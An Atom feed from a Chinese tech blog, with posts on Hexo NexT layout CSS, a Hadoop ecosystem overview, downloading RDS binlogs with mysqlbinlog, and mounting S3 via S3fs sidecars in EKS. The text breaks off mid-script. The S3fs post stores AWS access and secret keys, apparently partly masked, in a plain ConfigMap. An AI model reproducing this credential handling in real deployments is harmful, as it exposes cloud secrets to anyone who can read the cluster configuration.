<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>凡间的精灵</title>
  
  <subtitle>凡尘落素一精灵</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chenzhonzhou.github.io/"/>
  <updated>2021-09-27T09:05:36.605Z</updated>
  <id>http://chenzhonzhou.github.io/</id>
  
  <author>
    <name>Zhongzhou Chen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hexo next 主题页面两侧空白问题</title>
    <link href="http://chenzhonzhou.github.io/2021/09/27/hexo-next-zhu-ti-ye-mian-liang-ce-kong-bai-wen-ti/"/>
    <id>http://chenzhonzhou.github.io/2021/09/27/hexo-next-zhu-ti-ye-mian-liang-ce-kong-bai-wen-ti/</id>
    <published>2021-09-27T03:26:54.000Z</published>
    <updated>2021-09-27T09:05:36.605Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:07:15 GMT+0800 (GMT+08:00) --><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近使用hexo next主题时发现页面内容两侧有大量空白区域，很影响阅读体验，如下所示：</p><p><img src="/2021/09/27/hexo-next-zhu-ti-ye-mian-liang-ce-kong-bai-wen-ti/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法也很简单，只需要修改两个next主题配置文件</p><p>在主题配置文件 <code>next/source/css/_variables/custom.styl</code> 中添加内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改成你期望的宽度</span></span><br><span class="line"><span class="variable">$content</span>-desktop = <span class="number">700px</span></span><br><span class="line"><span class="comment">// 当视窗超过 1600px 后的宽度</span></span><br><span class="line"><span class="variable">$content</span>-desktop-large = <span class="number">900px</span></span><br></pre></td></tr></table></figure><p>在主题配置文件 <code>next/source/css/_schemes/Pisces/_layout.styl</code> 修改内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.header&#123; <span class="attribute">width</span>: <span class="number">99.5%</span>; &#125; </span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-class">.main-inner</span> &#123; <span class="attribute">width</span>: <span class="number">99.5%</span>; &#125; </span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123; <span class="attribute">width</span>: calc(<span class="number">100%</span> - <span class="number">260px</span>); &#125;</span><br></pre></td></tr></table></figure><p>主要是修改 <code>_layout.styl</code> 配置文件</p><p>调整后效果如下</p><p><img src="/2021/09/27/hexo-next-zhu-ti-ye-mian-liang-ce-kong-bai-wen-ti/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:07:15 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;最近使用h
      
    
    </summary>
    
    
      <category term="hexo" scheme="http://chenzhonzhou.github.io/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://chenzhonzhou.github.io/tags/hexo/"/>
    
      <category term="NexT" scheme="http://chenzhonzhou.github.io/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop 概述</title>
    <link href="http://chenzhonzhou.github.io/2021/09/26/hadoop-gai-shu/"/>
    <id>http://chenzhonzhou.github.io/2021/09/26/hadoop-gai-shu/</id>
    <published>2021-09-26T10:01:11.000Z</published>
    <updated>2021-09-27T08:14:43.044Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="Hadoop-简介"><a href="#Hadoop-简介" class="headerlink" title="Hadoop 简介"></a>Hadoop 简介</h2><p>Hadoop是一个由Apache软件基金会开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序，充分利用集群的威力进行高速运算和存储。</p><p>Hadoop实现了一个分布式文件系统（Hadoop Distributed File System，HDFS）。HDFS具有高容错性的特点，并设计它用来部署在价格低廉的硬件上，而且它提供高吞吐量来访问应用程序的数据，适合那些有着超大数据集的应用程序。Hadoop框架的核心设计就是HDFS和MapReduce。HDFS为海量的数据提供了存储，而MapReduce则为海量的数据提供了计算。</p><h3 id="1-1-项目起源"><a href="#1-1-项目起源" class="headerlink" title="1.1 项目起源"></a>1.1 项目起源</h3><p>Hadoop被Apache软件基金会于2005年作为Lucene子项目Nutch的一部分正式引入。它受到谷歌实验室开发的MapReduce和Google File System(GFS)的启发。2006年3月，MapReduce和Nutch Distributed File System（NDFS）分别被纳入称为Hadoop的项目中。</p><h3 id="1-2-发展历程"><a href="#1-2-发展历程" class="headerlink" title="1.2 发展历程"></a>1.2 发展历程</h3><p>Hadoop原本来自于谷歌一款名为MapReduce的编程模型包。谷歌的MapReduce框架可以把一个应用程序分解为许多并行计算指令，跨大量的计算节点运行非常巨大的数据集。使用该框架的一个典型例子就是在网络数据上运行的搜索算法。Hadoop最初只与网页索引有关，但后来迅速发展成为分析大数据的领先平台。</p><h3 id="1-3-名字起源"><a href="#1-3-名字起源" class="headerlink" title="1.3 名字起源"></a>1.3 名字起源</h3><p>Hadoop这个名字不是一个缩写，而是一个虚构的名字。该项目的创建者Doug Cutting这样解释Hadoop的命名：<code>这个名字是我孩子给一个棕黄色的大象玩具起的名字。我的命名标准就是简短、容易发音和拼写，没有太多的意义，并且不会被用于别处。小孩子恰恰是这方面的高手。</code></p><h3 id="1-4-优点"><a href="#1-4-优点" class="headerlink" title="1.4 优点"></a>1.4 优点</h3><p>Hadoop是一个能够对大量数据进行分布式处理的软件框架，以一种可靠、高效、可伸缩的方式进行数据处理。Hadoop是一个能够让用户轻松架构和使用的分布式计算平台，用户可以轻松地在Hadoop上开发和运行处理海量数据的应用程序。<br>Hadoop主要有以下几个优点。<br>（1）高可靠性。因为它假设计算元素和存储会失败，因此它维护多个工作数据副本，确保能够针对失败的节点重新分布处理。<br>（2）高扩展性。Hadoop是在可用的计算机集群间分配数据并完成计算任务的，这些集群可以方便地扩展到数以千计的节点中。<br>（3）高效性。Hadoop能够在节点之间动态地移动数据，并保证各个节点的动态平衡，以并行的方式工作，通过并行处理加快处理速度，因此处理速度非常快。<br>（4）高容错性。Hadoop能够自动保存数据的多个副本，并且能够自动将失败的任务重新分配。<br>（5）低成本。与一体机、商用数据仓库等工具相比，Hadoop是开源的，项目的软件成本会大大降低。Hadoop带有用Java语言编写的框架，因此运行在Linux生产平台上也是比较低成本的。</p><h3 id="1-5-Hadoop-三大核心组件"><a href="#1-5-Hadoop-三大核心组件" class="headerlink" title="1.5 Hadoop 三大核心组件"></a>1.5 Hadoop 三大核心组件</h3><p>（1）<strong>HDFS</strong>：hadoop分布式文件系统海量数据存储（集群服务）。</p><p>（2）<strong>MapReduce</strong>：分布式运算框架（编程框架），海量数据运算分析。</p><p>（3）<strong>Yarn</strong>：资源调度管理集群（可以理解为一个分布式的操作系统，管理和分配集群硬件资源）。 用MapReduce编写一个程序，到Yarn运行平台上去运行。</p><h2 id="Hadoop-1-X和2-X的区别"><a href="#Hadoop-1-X和2-X的区别" class="headerlink" title="Hadoop 1.X和2.X的区别"></a>Hadoop 1.X和2.X的区别</h2><p><img src="/2021/09/26/hadoop-gai-shu/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><h2 id="Hadoop-3-X的新特性"><a href="#Hadoop-3-X的新特性" class="headerlink" title="Hadoop 3.X的新特性"></a>Hadoop 3.X的新特性</h2><p>相较于早期的Hadoop 1.X和Hadoop 2.X，Hadoop 3.X具有很多新的特性。本书采用Hadoop 3.X版本。<br>对于Hadoop 3.X的新特性，读者可先进行简单了解，不用深入研究，后续章节将进一步讲解。<br>Hadoop 3.X的主要新特性如下:<br>（1）Java的最低版本要求从Java 7更改成Java 8。<br>（2）HDFS支持纠删码（Erasure Coding），从而将数据存储空间节省了50%。<br>（3）引入YARN的时间轴服务v.2（YARN Timeline Service v.2）。<br>（4）重写了Shell脚本。<br>（5）隐藏底层jar包。<br>（6）支持containers和分布式调度。<br>（7）MapReduce任务级本地优化。<br>（8）支持多于两个的NameNodes。<br>（9）改变了多个服务的默认端口（例如HDFS的Web界面，默认端口由50070变成9870）。<br>（10）用Intra解决DataNode宕机负载不均衡的问题。<br>（11）重写守护进程以及任务的堆内存管理。<br>（12）支持Microsoft Azure Data Lake文件系统。<br>（13）解决了AMAZON S3的数据一致性问题。</p><h2 id="Hadoop-生态子项目"><a href="#Hadoop-生态子项目" class="headerlink" title="Hadoop 生态子项目"></a>Hadoop 生态子项目</h2><p>尽管Hadoop因MapReduce及其分布式文件系统HDFS而出名，但Hadoop这个名字也用于泛指一组相关的项目，这些相关项目都使用这个基础平台进行分布式计算和海量数据处理，如下图所示。</p><p><img src="/2021/09/26/hadoop-gai-shu/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><style>table th:first-of-type{width:80px}table th:nth-of-type(2){width:80px}</style><table><thead><tr><th>项目名称</th><th>功能</th><th>项目描述</th></tr></thead><tbody><tr><td>Flume</td><td>日志收集工具</td><td>Flume 是一个分布式、高可靠、高可用的，海量日志采集、聚合和传输的系统。</td></tr><tr><td>YARN</td><td>分布式资源管理器</td><td>Apache Hadoop YARN （Yet Another Resource Negotiator，另一种资源协调者）是一种新的 Hadoop 资源管理器，它是一个通用资源管理系统，可为上层应用提供统一的资源管理和调度，它的引入为集群在利用率、资源统一管理和数据共享等方面带来了巨大好处。YARN是下一代MapReduce，即MRv2，是在第一代MapReduce基础上演变而来的，主要是为了解决原始Hadoop扩展性较差，不支持多计算框架而提出的。yarn是一个通用的运行时框架，用户可以编写自己的计算框架，在该运行环境中运行。</td></tr><tr><td>Mesos</td><td>分布式资源管理器</td><td>Mesos诞生于UC Berkeley的一个研究项目，现已成为Apache项目，当前有一些公司使用Mesos管理集群资源，比如Twitter。与yarn类似，Mesos是一个资源统一管理和调度的平台，同样支持比如MR、 steaming等多种运算框架。</td></tr><tr><td>HDFS</td><td>Hadoop分布式文件系统</td><td>Apache Hadoop分布式文件系统（HDFS）是Hdoop应用程序使用的主要存储系统，HDFS创建多个数据块副本并将他们分布在整个集群的计算主机上，以启用可靠且级其快速的计算功能。</td></tr><tr><td>HBase</td><td>分布式列存数据库</td><td>一种非关系型分布式NoSQL数据库，与传统数据库相比，采用列的方式进行存储，具有高加载、低延迟的特性，可于千亿级数据的快速查询。HBase采用了BigTable的数据模型：增强的稀疏排序映射表（Key/Value），其中，键由行关键字、列关键字和时间戳构成。HBase提供了对大规模数据的随机、实时读写访问，同时，HBase中保存的数据可以使用MapReduce来处理，它将数据存储和并行计算完美地结合在一起。</td></tr><tr><td>Phoenix</td><td>hbase sql接口</td><td>Apache Phoenix 是HBase的SQL驱动，Phoenix 使得Hbase 支持通过JDBC的方式进行访问，并将你的SQL查询转换成Hbase的扫描和相应的动作。</td></tr><tr><td>Hive</td><td>数据仓库</td><td>基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的SQL查询功能，可以将SQL语句转换为MapReduce任务进行运行。其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</td></tr><tr><td>Presto</td><td>分布式SQL查询引擎</td><td>Presto是一个开源的分布式SQL查询引擎，适用于交互式分析查询，数据层支持GB到PB字节。Presto的设计和编写完全是为了解决如Facebook这样规模的商业数据仓库的交互式分析和处理速度的问题，它拥有比Hive更高的执行效率，并针对不同的数据源提供了对应的连接器，用于实现统一的ETL。</td></tr><tr><td>MapReduce</td><td>分布式计算框架</td><td>MapReduce是一种编程模型，利用函数式编程思想，将对数据集的过程分为Map和Reduce两个阶段。MapReduce的这种编程模型非常适合进行分布式计算。Hadoop提供MapReduce的计算框架，实现了这种编程模型，用户可以通过Java\C++\Python\PHP等多种语言进行编程。</td></tr><tr><td>Oozie</td><td>工作流调度器</td><td>Oozie是一个工作流调度引擎，可按时间或数据变化触发运行，是集群中管理数据处理作业的工作流协调服务。Oozie 可以把多个 MR 作业组合到一个逻辑工作单元中，从而完成更大型的任务。Oozie 是一种 Java Web 应用程序，它运行在 Java Servlet 容器中（即：Tomcat）中。</td></tr><tr><td>Pig</td><td>ad-hoc脚本</td><td>数据流处理语言，按照语法以流利化的方式描述数据处理流程，并以分布式的方式完成数据的处理，适合于使用Hadoop和MapReduce平台查询大型半结构化数据集。</td></tr><tr><td>Sqoop</td><td>数据ETL/同步工具</td><td>主要用于在Hadoop（Hive）与传统数据库（MySQL、PostGresql等）间进行高效批量数据传递，可以将一个关系型数据库（如MySQL、Oracle、Postgres等）中的数据导入到Hadoop的HDFS中，也可以将HDFS的数据导出到关系型数据库中。</td></tr><tr><td>Zookeeper</td><td>分布式协作服务</td><td>一个开放源码的分布式应用程序协调服务，是谷歌的Chubby一个开源的实现，是Hadoop和HBase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括配置维护、域名服务、分布式同步、组服务等。</td></tr><tr><td>falcon</td><td>数据生命周期管理工具</td><td>Apache Falcon 是一个面向Hadoop的、新的数据处理和管理平台，设计用于数据移动、数据管道协调、生命周期管理和数据发现。它使终端用户可以快速地将他们的数据及其相关的处理和管理任务<code>上载（onboard）</code>到Hadoop集群。</td></tr><tr><td>knox</td><td>hadoop安全网关</td><td>Apache knox是一个访问hadoop集群的restapi网关，它为所有rest访问提供了一个简单的访问接口点，能完成3A认证（Authentication，Authorization， Auditing）和SSO（单点登录）等。</td></tr><tr><td>Kafka</td><td>分布式消息队列</td><td>分布式消息发布－订阅系统，用于处理流式海量数据。Kafka 是一个由 LinkedIn 开发的消息队列。能嫁接 HDFS 这样的存储介质，能被 Storm，Spark这类实时或类实时数据模型消费。</td></tr><tr><td>Storm</td><td>分布式流数据处理系统</td><td>Apache Storm是一个分布式、可靠、容错的数据流处理系统，适用于实时分析、在线机器学习、连续计算、分布式RPC、分布式ETL等。</td></tr><tr><td>Spark</td><td>内存DAG计算模型</td><td>Spack具有支持循环数据流和内存计算的先进的DAG执行引擎，所以比Hadoop MapRecue在内存计算上快100倍，在硬盘计算上快10倍。Spark提供了Java，Scala，Python和R等语言的高级API，可以用于快速开发相关语言应用。Spark提供了超过80个高级的操作，可以轻松构建并行应用程序。</td></tr><tr><td>MLib</td><td>机器学习库</td><td>Spark MLlib是一个机器学习库，它提供了各种各样的算法，这些算法用来在集群上针对分类、回归、聚类、协同过滤等。</td></tr><tr><td>Kylin</td><td>分布式分析引擎</td><td>Kylin 是一款开源的分布式数据分析引擎由 eBay 公司提供，用于分布式的OLAP和多维数据分析工具。</td></tr><tr><td>Mahout</td><td>数据挖掘算法库</td><td>Mahout是一个机器学习和数据挖掘库，它利用MapReduce编程模型实现k-means,Native,Bayes,Collaborative Filtering等经典的机器学习算法，并使其具有良好的可扩展性。</td></tr><tr><td>Common</td><td>Hadoop底层模块工具</td><td>Hadoop Common是Hadoop体系最底层的一个模块，为Hadoop各个子模块提供各种工具，比如系统配置工具Configuration、远程调用RPC、序列化机制和日志操作等等，是其他模块的基础。</td></tr><tr><td>Tachyon</td><td>分布式内存文件系统</td><td>Tachyon（/‘tæki:ˌɒn/ 意为超光速粒子）是以内存为中心的分布式文件系统，拥有高性能和容错能力，能够为集群框架（如Spark、MapReduce）提供可靠的内存级速度的文件共享服务。Tachyon诞生于UC Berkeley的AMPLab。</td></tr><tr><td>Tez</td><td>DAG计算模型</td><td>Tez是Apache最新开源的支持DAG作业的计算框架，它直接源于MapReduce框架，核心思想是将Map和Reduce两个操作进一步拆分，即Map被拆分成Input、Processor、Sort、Merge和Output， Reduce被拆分成 Input、Shuffle、Sort、Merge、Processor和Output等，这样，这些分解后的元操作可以任意灵活组合，产生新的操作，这些操作经过一些控制程序组装后，可形成一个大的DAG作业。目前hive支持mr、tez计算模型，tez能完美二进制mr程序，提升运算性能。</td></tr><tr><td>Giraph</td><td>图计算模型</td><td>Apache Giraph是一个可伸缩的分布式迭代图处理系统， 基于Hadoop平台，灵感来自 BSP (bulk synchronous parallel) 和 Google 的 Pregel。最早出自雅虎。雅虎在开发Giraph时采用了Google工程师2010年发表的论文《Pregel：大规模图表处理系统》中的原理。后来，雅虎将Giraph捐赠给Apache 软件基金会。</td></tr><tr><td>GraphX</td><td>图计算模型</td><td>Spark GraphX最先是伯克利AMPLAB的一个分布式图计算框架项目，目前整合在 spark运行框架中，为其提供BSP大规模并行图计算能力。</td></tr><tr><td>Streaming</td><td>流计算模型</td><td>Spark Streaming支持对流数据的实时处理，以微批的方式对实时数据进行计算。</td></tr><tr><td>Ambari</td><td>安装部署配置管理工具</td><td>Apache Ambari 的作用来说，就是创建、管理、监视 Hadoop 的集群，是为了让 Hadoop 以及相关的大数据软件更容易使用的一个web工具。</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;Hadoop-简介&quot;&gt;&lt;a href=&quot;#Hadoop-简介&quot; class=&quot;headerlink&quot; title=&quot;Hadoop 简介
      
    
    </summary>
    
    
      <category term="Hadoop" scheme="http://chenzhonzhou.github.io/categories/Hadoop/"/>
    
    
      <category term="Hadoop" scheme="http://chenzhonzhou.github.io/tags/Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 使用 mysqlbinlog拉取RDS binlog日志</title>
    <link href="http://chenzhonzhou.github.io/2021/09/07/mysql-shi-yong-mysqlbinlog-la-qu-binlog-ri-zhi/"/>
    <id>http://chenzhonzhou.github.io/2021/09/07/mysql-shi-yong-mysqlbinlog-la-qu-binlog-ri-zhi/</id>
    <published>2021-09-07T09:29:38.000Z</published>
    <updated>2021-09-15T02:00:28.875Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:49 GMT+0800 (GMT+08:00) --><h3><a href="#" class="headerlink"></a></h3><p>对于云 RDS 可使用 mysqlbinlog 实用程序从运行 MySQL 5.6 或更高版本的 RDS 实例下载或流式传输二进制日志。二进制日志下载到本地计算机，可以执行一些操作，例如使用 mysql 实用程序执行重放日志。</p><p>要针对云RDS实例使用 mysqlbinlog 工具，请使用下列选项：</p><ul><li>指定 <code>--read-from-remote-server</code> 选项。</li><li><code>--host</code>：指定该实例所在的终端节点中的 DNS 名称。</li><li><code>--port</code>：指定该实例使用的端口。</li><li><code>--user</code>：指定已授予了复制从属实例权限的 MySQL 用户。</li><li><code>--password</code>：指定用户的密码，或忽略密码值以让实用程序提示您输入密码。</li><li>要按二进制格式下载文件，请指定 <code>--raw</code> 选项。</li><li><code>--result-file</code>：指定用于接收原始输出的本地文件。</li><li><code>--raw</code> 输出原始binlog数据而不是SQL语句，输出为日志文件。</li><li>指定一个或多个二进制日志文件的名称。要获取可用日志的列表，请使用 SQL 命令 SHOW BINARY LOGS。</li><li>要流式传输二进制日志文件，请指定 <code>--stop-never</code> 选项。</li></ul><p>有关 mysqlbinlog 选项的更多信息，请转到 <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqlbinlog.html" target="_blank" rel="noopener">mysqlbinlog - 处理二进制日志文件的实用程序</a>。</p><h3 id="下载binlog日志"><a href="#下载binlog日志" class="headerlink" title="下载binlog日志"></a>下载binlog日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysqlbinlog \</span></span><br><span class="line">  --<span class="built_in">read</span>-from-remote-server \</span><br><span class="line">  --host=master.mysql.3307.basic.prod.cvxcloud.com \</span><br><span class="line">  --port=3307 \</span><br><span class="line">  --user root \</span><br><span class="line">  --password \</span><br><span class="line">  --raw \</span><br><span class="line">  --result-file=/tmp/ \</span><br><span class="line">  mysql-bin-changelog.112916</span><br></pre></td></tr></table></figure><h3 id="解析binlog"><a href="#解析binlog" class="headerlink" title="解析binlog"></a>解析binlog</h3><p>如果使用的<code>--raw</code>参数，则需要解析binlog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysqlbinlog --no-defaults --base64-output='decode-rows' -v /tmp/mysql-bin-changelog.112916</span></span><br></pre></td></tr></table></figure><h3 id="binlog轮转时间"><a href="#binlog轮转时间" class="headerlink" title="binlog轮转时间"></a>binlog轮转时间</h3><p>Amazon RDS 通常会尽快清除二进制日志，但二进制日志必须仍在实例上提供，供 mysqlbinlog 访问。若要指定 RDS 保留二进制日志的小时数，请使用 <code>mysql.rds_set_configuration</code> 存储过程并指定一个包含的时间足以让您下载这些日志的时间段。设置保留期后，监视数据库实例的存储用量以确认保留的二进制日志不会占用太多存储空间。</p><p>通过以下命令查看现在的轮转周期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; call mysql.rds_show_configuration;</span><br></pre></td></tr></table></figure><p>修改binlog的轮转周期为1天</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; call mysql.rds_set_configuration(&apos;binlog retention hours&apos;, 24);</span><br></pre></td></tr></table></figure><blockquote><p>注：<code>mysql.rds_set_configuration</code> 存储过程只能用于 MySQL 5.6 或更高版本。</p></blockquote><h3 id="AWS-RDS-MySQL-的日志默认保存周期"><a href="#AWS-RDS-MySQL-的日志默认保存周期" class="headerlink" title="AWS RDS(MySQL) 的日志默认保存周期"></a>AWS RDS(MySQL) 的日志默认保存周期</h3><p>MySQL 有错误日志、慢查询日志、常规日志、审计日志和Binlog。错误日志是默认打开的，慢查询日志和审计日志需要修改参数组才能打开，审计日志需要修改选项组才能打开。Binlog默认不保存。</p><table><thead><tr><th>MySQL RDS</th><th>打开方法</th><th>默认保存周期</th></tr></thead><tbody><tr><td>审计日志</td><td>修改选项组</td><td>文件达到1MiB后轮换，保留9个文件</td></tr><tr><td>错误日志</td><td>已默认打开</td><td>文件每小时轮换一次，保留24小时</td></tr><tr><td>慢查询日志</td><td>修改参数组</td><td>mysql.slow_log表，每24小时轮换</td></tr><tr><td>常规日志</td><td>修改参数组</td><td>mysql.general_log表，每24小时轮换</td></tr><tr><td>binlog</td><td>执行存储过程</td><td>生成后尽快被删除，不保存</td></tr></tbody></table><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:49 GMT+0800 (GMT+08:00) --&gt;&lt;h3&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;对于云 RDS 可使用 mysqlbinlog 实用程序
      
    
    </summary>
    
    
      <category term="数据库" scheme="http://chenzhonzhou.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="MySQL" scheme="http://chenzhonzhou.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL/"/>
    
    
      <category term="数据库" scheme="http://chenzhonzhou.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="MySQL" scheme="http://chenzhonzhou.github.io/tags/MySQL/"/>
    
      <category term="mysqlbinlog" scheme="http://chenzhonzhou.github.io/tags/mysqlbinlog/"/>
    
  </entry>
  
  <entry>
    <title>EKS 挂载S3fs 文件系统</title>
    <link href="http://chenzhonzhou.github.io/2021/08/11/eks-gua-zai-s3fs-wen-jian-xi-tong/"/>
    <id>http://chenzhonzhou.github.io/2021/08/11/eks-gua-zai-s3fs-wen-jian-xi-tong/</id>
    <published>2021-08-11T03:37:18.000Z</published>
    <updated>2021-08-24T03:52:34.267Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于原来使用本地目录访问数据的应用程序，比如使用本地磁盘或网络共享盘保存数据的应用系统，如果用户希望把数据放到S3上，则需要修改数据的访问方式，比如修改为使用AWS SDK 或CLI访问S3中存储的数据。</p><p>同时在AWS上实现kubernetes集群是很多用户的需求，无论是使用托管服务还是自建kubernetes集群，存储都是kubernetes集群搭建的重点。并且docker的部署方式也让客户程序减少了对于底层环境的依赖。为了让用户原来的应用系统能在不做修改的情况下直接使用Amazon S3服务，需要把S3存储桶作为目录挂载到用户EKS集群中的worker结点上。</p><p>这里主要介绍如何利用S3fs将S3存储桶在EKS平台上以<code>sidecar</code>方式挂载到Amazon EKS的worker实例上的pod中，挂载后需要读写此存储桶的pod都可以对此桶进行读写，以实现共享存储功能。</p><h2 id="什么是-S3FS"><a href="#什么是-S3FS" class="headerlink" title="什么是 S3FS"></a>什么是 S3FS</h2><p>S3fs是基于FUSE的文件系统，允许Linux和Mac Os X 挂载S3的存储桶在本地文件系统，S3fs能够保持对象原来的格式,S3FS是POSIX的大子集，包括读/写文件、目录、符号链接、模式、uid/gid和扩展属性，与AmazonS3、Google云存储和其他基于S3的对象存储兼容。关于S3fs的详细介绍，请参见：<a href="https://github.com/s3fs-fuse/s3fs-fuse" target="_blank" rel="noopener">https://github.com/s3fs-fuse/s3fs-fuse</a></p><h2 id="K8s-pod-中使用S3FS架构图"><a href="#K8s-pod-中使用S3FS架构图" class="headerlink" title="K8s pod 中使用S3FS架构图"></a>K8s pod 中使用S3FS架构图</h2><p><img src="/2021/08/11/eks-gua-zai-s3fs-wen-jian-xi-tong/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li>已经搭建完成k8s 集群；</li><li>镜像仓库，存放构建的kube-s3 镜像；</li><li>准备好S3存储桶；</li><li>IAM用户具备S3桶读写权限。</li></ol><h2 id="实施过程"><a href="#实施过程" class="headerlink" title="实施过程"></a>实施过程</h2><h3 id="1-下载S3fs-代码"><a href="#1-下载S3fs-代码" class="headerlink" title="1.下载S3fs 代码"></a>1.下载S3fs 代码</h3><p>下载S3fs代码到kubectl 可与k8s master结点交互执行的机器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git clone https://github.com/freegroup/kube-s3.git</span></span><br></pre></td></tr></table></figure><h3 id="2-配置configmap"><a href="#2-配置configmap" class="headerlink" title="2.配置configmap"></a>2.配置configmap</h3><p>将configmap_secrets_template.yaml复制到configmap_secrets.yaml并将您的aksk，s3 backet放置在正确的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd kube-s3/yaml/</span></span><br><span class="line"><span class="comment"># vim configmap_secrets.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  name: s3-config</span><br><span class="line">data:</span><br><span class="line">  S3_BUCKET: <span class="built_in">test</span>-backut</span><br><span class="line">  AWS_KEY: AKIAU4PH111111111111</span><br><span class="line">  AWS_SECRET_KEY: +4HWAoYoRRAGawIy0RLE8pyyE205111111111111</span><br><span class="line"></span><br><span class="line"><span class="comment"># kubectp apply -f configmap_secrets.yaml</span></span><br></pre></td></tr></table></figure><p>这里挂载的是<code>test-backut</code>存储桶的根目录，如果要挂载<code>test-backut/data</code>目录，可以写成<code>test-backut:/data</code></p><h3 id="3-构建镜像"><a href="#3-构建镜像" class="headerlink" title="3.构建镜像"></a>3.构建镜像</h3><p>如果懒得构建，也可以使用我构建好的镜像：<code>chenzz/kube-s3:v1.0</code></p><p>3.1 构建镜像前修改Dockerfile 将 <code>apk del git automake autoconf;</code> 这行注示掉，否则镜像运行时会报错找不到<code>aclocal</code>命令</p><p>3.2 将apline镜像版本修改为<code>alpine:3.13</code>，默认<code>latest</code> 会报 <code>make: /bin/sh: Operation not permitted</code> 错误</p><p>3.3 根据情况修改build.sh脚本，允许执行哪些步骤，以及配置好镜像仓库地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"> </span><br><span class="line">VERSION=<span class="variable">$1</span></span><br><span class="line">PROJECT=kube-s3</span><br><span class="line">REPOSITORY=docker.chenzz.local/public</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"> 